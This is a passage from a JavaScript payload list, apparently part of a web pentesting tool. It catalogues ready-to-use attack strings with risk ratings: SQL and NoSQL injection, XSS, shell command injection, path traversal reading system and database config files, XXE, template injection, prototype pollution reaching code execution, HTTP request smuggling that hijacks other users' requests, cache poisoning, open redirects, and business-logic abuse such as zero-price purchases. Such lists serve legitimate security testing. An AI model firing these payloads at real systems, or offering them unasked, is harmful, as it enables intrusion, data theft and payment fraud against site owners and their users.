    name: "Preflight bypass (simple request)",
    payload: "POST with Content-Type: text/plain to bypass preflight requirement",
    desc: "Bypass CORS preflight by using simple request criteria",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Internal CORS (localhost)",
    payload: "Origin: http://localhost",
    desc: "Test if localhost is allowed in CORS policy (developer leftover)",
    risk: "high"
  },
  {
    cat: "CORS",
    name: "Vary header missing",
    payload: "Check if Vary: Origin header is missing when ACAO reflects origin",
    desc: "Cache poisoning risk when Vary: Origin is not set with reflected ACAO",
    risk: "high"
  },

  // ==========================================================================
  // ADDITIONAL PAYLOADS TO REACH 400+ TOTAL
  // ==========================================================================

  // --- Additional SQLi ---
  {
    cat: "SQLi",
    name: "ORDER BY column enum",
    payload: "' ORDER BY 1--",
    desc: "Enumerate column count via ORDER BY for UNION injection prep",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "SQLi via XML (MSSQL)",
    payload: "'; DECLARE @x xml; SET @x='<r><![CDATA[<]]></r>'; EXEC('sel'+'ect @@version')--",
    desc: "MSSQL injection using XML CDATA to bypass WAF",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Boolean subquery enum",
    payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
    desc: "Conditional subquery for precise boolean-based extraction",
    risk: "high"
  },

  // --- Additional XSS ---
  {
    cat: "XSS",
    name: "Img lowsrc",
    payload: "<img lowsrc=javascript:alert(1)>",
    desc: "XSS via legacy lowsrc attribute (old browsers)",
    risk: "low"
  },
  {
    cat: "XSS",
    name: "Object data XSS",
    payload: "<object data=\"javascript:alert(1)\">",
    desc: "XSS via object element data attribute",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Style expression (IE)",
    payload: "<div style=\"width:expression(alert(1))\">",
    desc: "XSS via CSS expression (IE only, historical)",
    risk: "low"
  },
  {
    cat: "XSS",
    name: "SVG script tag",
    payload: "<svg><script>alert(1)</script></svg>",
    desc: "XSS via script tag within SVG namespace",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Link stylesheet XSS",
    payload: "<link rel=stylesheet href=\"data:text/css,*{background:url('javascript:alert(1)')}\">",
    desc: "XSS via stylesheet with javascript URL in CSS",
    risk: "medium"
  },

  // --- Additional CMDi ---
  {
    cat: "CMDi",
    name: "Ampersand background",
    payload: "& id &",
    desc: "Background command execution with single ampersand",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Double pipe",
    payload: "|| whoami",
    desc: "Execute on failure using double pipe OR",
    risk: "critical"
  },

  // --- Additional LFI ---
  {
    cat: "LFI",
    name: "Proc version",
    payload: "../../../../proc/version",
    desc: "Read kernel version from proc filesystem",
    risk: "medium"
  },
  {
    cat: "LFI",
    name: "Crontab",
    payload: "../../../../etc/crontab",
    desc: "Read system crontab for scheduled tasks reconnaissance",
    risk: "medium"
  },
  {
    cat: "LFI",
    name: "MySQL config",
    payload: "../../../../etc/mysql/my.cnf",
    desc: "Read MySQL configuration file",
    risk: "high"
  },

  // --- Additional SSRF ---
  {
    cat: "SSRF",
    name: "Localhost (bracket notation)",
    payload: "http://[0:0:0:0:0:ffff:127.0.0.1]/admin",
    desc: "SSRF using IPv4-mapped IPv6 address in bracket notation",
    risk: "high"
  },

  // --- Additional XXE ---
  {
    cat: "XXE",
    name: "DTD-less entity attack",
    payload: "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hostname\"/></root>",
    desc: "XXE without DOCTYPE using XInclude for XML parsers that block DTD",
    risk: "high"
  },

  // --- Additional SSTI ---
  {
    cat: "SSTI",
    name: "Jinja2 class hierarchy",
    payload: "{{''.__class__.__mro__}}",
    desc: "Jinja2: enumerate class hierarchy for gadget discovery",
    risk: "high"
  },
  {
    cat: "SSTI",
    name: "Jinja2 subclasses list",
    payload: "{{''.__class__.__mro__[1].__subclasses__()}}",
    desc: "Jinja2: list all subclasses of object for RCE gadgets",
    risk: "high"
  },

  // --- Additional LDAPi ---
  {
    cat: "LDAPi",
    name: "Blind length check",
    payload: "admin)(userPassword=????????",
    desc: "LDAP blind password length check via fixed-length wildcard",
    risk: "high"
  },

  // --- Additional HeaderInj ---
  {
    cat: "HeaderInj",
    name: "X-Forwarded-Proto",
    payload: "X-Forwarded-Proto: http",
    desc: "Force HTTP scheme to cause mixed content or redirect loops",
    risk: "medium"
  },
  {
    cat: "HeaderInj",
    name: "X-Forwarded-Port",
    payload: "X-Forwarded-Port: 443",
    desc: "Override forwarded port to manipulate URL generation",
    risk: "medium"
  },

  // --- Additional CSRF ---
  {
    cat: "CSRF",
    name: "CSRF via link prefetch",
    payload: "<link rel=prefetch href=\"https://target.com/api/delete?id=1\">",
    desc: "CSRF via browser link prefetching (GET-based actions)",
    risk: "medium"
  },

  // --- Additional Open Redirect ---
  {
    cat: "OpenRedirect",
    name: "Triple slash bypass",
    payload: "///evil.com",
    desc: "Triple slash redirect bypass for path-based validation",
    risk: "medium"
  },
  {
    cat: "OpenRedirect",
    name: "Backslash in scheme",
    payload: "http:\\\\evil.com",
    desc: "Backslash in URL scheme for redirect bypass",
    risk: "medium"
  },

  // --- Additional IDOR ---
  {
    cat: "IDOR",
    name: "Base64 encoded ID",
    payload: "GET /api/resource/YWRtaW4= (base64 of 'admin')",
    desc: "IDOR with base64-encoded resource identifiers",
    risk: "high"
  },
  {
    cat: "IDOR",
    name: "Hash-based ID prediction",
    payload: "GET /api/resource/MD5(email) (predict hash from known data)",
    desc: "IDOR via predictable hash-based identifiers",
    risk: "high"
  },

  // --- Additional NoSQLi ---
  {
    cat: "NoSQLi",
    name: "MongoDB $nin bypass",
    payload: "{\"username\":{\"$nin\":[]},\"password\":{\"$ne\":\"\"}}",
    desc: "MongoDB auth bypass using $nin (not in empty array = match all)",
    risk: "critical"
  },

  // --- Additional JWT ---
  {
    cat: "JWT",
    name: "Expired token reuse",
    payload: "Reuse expired JWT if server does not verify exp claim",
    desc: "Test if expired JWT tokens are still accepted",
    risk: "high"
  },
  {
    cat: "JWT",
    name: "JWT claim injection (iss)",
    payload: "Modify iss claim to bypass issuer validation",
    desc: "Change JWT issuer to bypass audience/issuer restrictions",
    risk: "high"
  },

  // --- Additional Deser ---
  {
    cat: "Deser",
    name: "Ruby Marshal RCE",
    payload: "Marshal.dump(ERBTemplate.new('<%= `id` %>'))",
    desc: "Ruby Marshal deserialization RCE via ERB template",
    risk: "critical"
  },

  // --- Additional WebSocket ---
  {
    cat: "WebSocket",
    name: "WS origin bypass",
    payload: "Origin: https://subdomain.target.com",
    desc: "WebSocket connection from subdomain to bypass Origin check",
    risk: "high"
  },

  // --- Additional GraphQL ---
  {
    cat: "GraphQL",
    name: "Mutation without auth",
    payload: "mutation{createAdmin(username:\"attacker\",password:\"pass\"){id}}",
    desc: "Test if admin-level mutations are accessible without authentication",
    risk: "critical"
  },

  // --- Additional CORS ---
  {
    cat: "CORS",
    name: "HTTP Origin in HTTPS",
    payload: "Origin: http://target.com (on HTTPS endpoint)",
    desc: "Test if HTTP origin accepted on HTTPS endpoint (protocol downgrade)",
    risk: "high"
  },

  // ==========================================================================
  // BONUS: PROTOTYPE POLLUTION (10 payloads)
  // ==========================================================================

  {
    cat: "ProtoPollution",
    name: "Proto via __proto__",
    payload: "{\"__proto__\":{\"isAdmin\":true}}",
    desc: "Prototype pollution via __proto__ in JSON merge/clone",
    risk: "critical"
  },
  {
    cat: "ProtoPollution",
    name: "Proto via constructor",
    payload: "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
    desc: "Prototype pollution via constructor.prototype path",
    risk: "critical"
  },
  {
    cat: "ProtoPollution",
    name: "Proto via query param",
    payload: "?__proto__[isAdmin]=true",
    desc: "Prototype pollution via URL query parameter parsing",
    risk: "critical"
  },
  {
    cat: "ProtoPollution",
    name: "Proto RCE (child_process)",
    payload: "{\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}",
    desc: "Prototype pollution to RCE via child_process spawn options",
    risk: "critical"
  },
  {
    cat: "ProtoPollution",
    name: "Proto XSS (innerHTML)",
    payload: "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
    desc: "Prototype pollution leading to DOM XSS via innerHTML default",
    risk: "high"
  },
  {
    cat: "ProtoPollution",
    name: "Proto via JSON.parse",
    payload: "JSON.parse('{\"__proto__\":{\"polluted\":true}}')",
    desc: "Prototype pollution via JSON.parse on attacker-controlled input",
    risk: "high"
  },
  {
    cat: "ProtoPollution",
    name: "Proto via lodash merge",
    payload: "_.merge({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    desc: "Prototype pollution via vulnerable lodash.merge",
    risk: "critical"
  },
  {
    cat: "ProtoPollution",
    name: "Proto via jQuery extend",
    payload: "$.extend(true, {}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    desc: "Prototype pollution via jQuery.extend deep merge",
    risk: "critical"
  },
  {
    cat: "ProtoPollution",
    name: "Proto status code override",
    payload: "{\"__proto__\":{\"status\":500}}",
    desc: "Prototype pollution to override HTTP response status codes",
    risk: "medium"
  },
  {
    cat: "ProtoPollution",
    name: "Proto template injection",
    payload: "{\"__proto__\":{\"block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require('child_process').execSync('id')\"}}}",
    desc: "Prototype pollution to SSTI in Pug/Jade template engine",
    risk: "critical"
  },

  // ==========================================================================
  // BONUS: CACHE POISONING (8 payloads)
  // ==========================================================================

  {
    cat: "CachePoison",
    name: "X-Forwarded-Host cache",
    payload: "X-Forwarded-Host: evil.com (on cacheable response)",
    desc: "Cache poisoning via X-Forwarded-Host to inject attacker domain in cached page",
    risk: "high"
  },
  {
    cat: "CachePoison",
    name: "X-Original-URL cache",
    payload: "GET /innocent HTTP/1.1\\r\\nX-Original-URL: /admin",
    desc: "Cache poisoning by making /admin content cached under /innocent URL",
    risk: "high"
  },
  {
    cat: "CachePoison",
    name: "Fat GET request",
    payload: "GET /page HTTP/1.1\\r\\nContent-Length: 30\\r\\n\\r\\n{\"search\":\"<script>alert(1)</script>\"}",
    desc: "Cache poisoning via body in GET request (fat GET)",
    risk: "high"
  },
  {
    cat: "CachePoison",
    name: "Parameter cloaking",
    payload: "GET /page?utm_content=x;callback=evil",
    desc: "Cache key excludes parameter but backend processes it",
    risk: "high"
  },
  {
    cat: "CachePoison",
    name: "Web cache deception",
    payload: "GET /account/settings/nonexistent.css",
    desc: "Cache authenticated page by appending static file extension",
    risk: "critical"
  },
  {
    cat: "CachePoison",
    name: "Path normalization diff",
    payload: "GET /account/..%2fadmin",
    desc: "Cache key uses raw path but backend normalizes, serving admin under user cache key",
    risk: "high"
  },
  {
    cat: "CachePoison",
    name: "Vary header absence",
    payload: "Inject X-Forwarded-Scheme: nothttps to poison cache with redirect loop",
    desc: "Cache poisoning via unkeyed header causing redirect to HTTP",
    risk: "high"
  },
  {
    cat: "CachePoison",
    name: "Range header poison",
    payload: "Range: bytes=0-0 (causes partial content cached as full response)",
    desc: "Cache poisoning via Range header caching partial content",
    risk: "medium"
  },

  // ==========================================================================
  // BONUS: HTTP REQUEST SMUGGLING (10 payloads)
  // ==========================================================================

  {
    cat: "Smuggling",
    name: "CL.TE basic",
    payload: "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED",
    desc: "CL.TE smuggling: frontend uses Content-Length, backend uses Transfer-Encoding",
    risk: "critical"
  },
  {
    cat: "Smuggling",
    name: "TE.CL basic",
    payload: "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n",
    desc: "TE.CL smuggling: frontend uses Transfer-Encoding, backend uses Content-Length",
    risk: "critical"
  },
  {
    cat: "Smuggling",
    name: "TE.TE obfuscation",
    payload: "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity",
    desc: "TE.TE smuggling with obfuscated Transfer-Encoding header",
    risk: "critical"
  },
  {
    cat: "Smuggling",
    name: "CL.TE request hijack",
    payload: "POST / HTTP/1.1\\r\\nContent-Length: 44\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n",
    desc: "CL.TE smuggling to hijack next user's request to /admin",
    risk: "critical"
  },
  {
    cat: "Smuggling",
    name: "CL.TE credential theft",
    payload: "POST / HTTP/1.1\\r\\nContent-Length: 100\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nPOST /log HTTP/1.1\\r\\nContent-Length: 1000\\r\\n\\r\\n",
    desc: "CL.TE smuggling to capture other users' request bodies",
    risk: "critical"
  },
  {
    cat: "Smuggling",
    name: "TE tab obfuscation",
    payload: "Transfer-Encoding:\\tchunked",
    desc: "TE header with tab instead of space after colon",
    risk: "high"
  },
  {
    cat: "Smuggling",
    name: "TE CRLF obfuscation",
    payload: "Transfer-Encoding:\\r\\nchunked",
    desc: "TE header with CRLF in value for parser confusion",
    risk: "high"
  },
  {
    cat: "Smuggling",
    name: "TE trailing space",
    payload: "Transfer-Encoding: chunked ",
    desc: "TE header with trailing space to confuse strict parsers",
    risk: "high"
  },
  {
    cat: "Smuggling",
    name: "H2.CL smuggling",
    payload: "HTTP/2 request with Content-Length that mismatches body (downgrade to HTTP/1.1)",
    desc: "HTTP/2 to HTTP/1.1 downgrade smuggling via Content-Length mismatch",
    risk: "critical"
  },
  {
    cat: "Smuggling",
    name: "H2 CRLF injection",
    payload: "HTTP/2 header with \\r\\n injection in header value for response splitting",
    desc: "HTTP/2 CRLF injection exploiting improper header sanitization",
    risk: "critical"
  },

  // ==========================================================================
  // BONUS: RACE CONDITIONS (6 payloads)
  // ==========================================================================

  {
    cat: "RaceCondition",
    name: "TOCTOU file access",
    payload: "Symlink race: ln -sf /etc/passwd /tmp/userfile (between check and use)",
    desc: "Time-of-check-to-time-of-use race via symlink swap",
    risk: "critical"
  },
  {
    cat: "RaceCondition",
    name: "Double spend",
    payload: "Send identical transfer request simultaneously from multiple threads",
    desc: "Race condition in financial transaction processing",
    risk: "critical"
  },
  {
    cat: "RaceCondition",
    name: "Coupon reuse",
    payload: "Apply same coupon code in parallel requests before validation",
    desc: "Race condition to apply single-use coupon multiple times",
    risk: "high"
  },
  {
    cat: "RaceCondition",
    name: "Account creation race",
    payload: "Create account with same email from two threads simultaneously",
    desc: "Race condition in account creation leading to duplicate accounts",
    risk: "high"
  },
  {
    cat: "RaceCondition",
    name: "Rate limit bypass",
    payload: "Send burst of requests simultaneously to bypass rate limiting",
    desc: "Race condition to bypass request rate limiting via concurrent requests",
    risk: "high"
  },
  {
    cat: "RaceCondition",
    name: "Password reset race",
    payload: "Request multiple password reset tokens simultaneously, use any",
    desc: "Race condition in token generation to get multiple valid reset tokens",
    risk: "high"
  },

  // ==========================================================================
  // BONUS: BUSINESS LOGIC (8 payloads)
  // ==========================================================================

  {
    cat: "BizLogic",
    name: "Negative quantity",
    payload: "{\"item\":\"product_1\",\"quantity\":-1,\"price\":100}",
    desc: "Negative quantity to trigger credit/refund in cart",
    risk: "critical"
  },
  {
    cat: "BizLogic",
    name: "Zero price override",
    payload: "{\"item\":\"premium\",\"price\":0}",
    desc: "Client-side price override to purchase for free",
    risk: "critical"
  },
  {
    cat: "BizLogic",
    name: "Decimal price abuse",
    payload: "{\"item\":\"product\",\"price\":0.001}",
    desc: "Fractional price to exploit rounding in payment processing",
    risk: "high"
  },
  {
    cat: "BizLogic",
    name: "Currency confusion",
    payload: "{\"amount\":100,\"currency\":\"JPY\"} (lowest denomination)",
    desc: "Currency swap to pay in lower-value denomination",
    risk: "high"
  },
  {
    cat: "BizLogic",
    name: "Step bypass (checkout)",
    payload: "POST /api/order/confirm (skip payment step)",
    desc: "Skip intermediate workflow steps by jumping to final action",
    risk: "critical"
  },
  {
    cat: "BizLogic",
    name: "Email verification skip",
    payload: "POST /api/profile/update (without email verification)",
    desc: "Skip email verification step in account update flow",
    risk: "high"
  },
  {
    cat: "BizLogic",
    name: "Role downgrade bypass",
    payload: "Downgrade admin to user, retain admin session, re-escalate",
    desc: "Role persistence after downgrade due to stale session",
    risk: "critical"
  },
  {
    cat: "BizLogic",
    name: "Integer overflow",
    payload: "{\"quantity\":2147483647}",
    desc: "Integer overflow in quantity field to wrap to negative/zero total",
    risk: "high"
  },

];
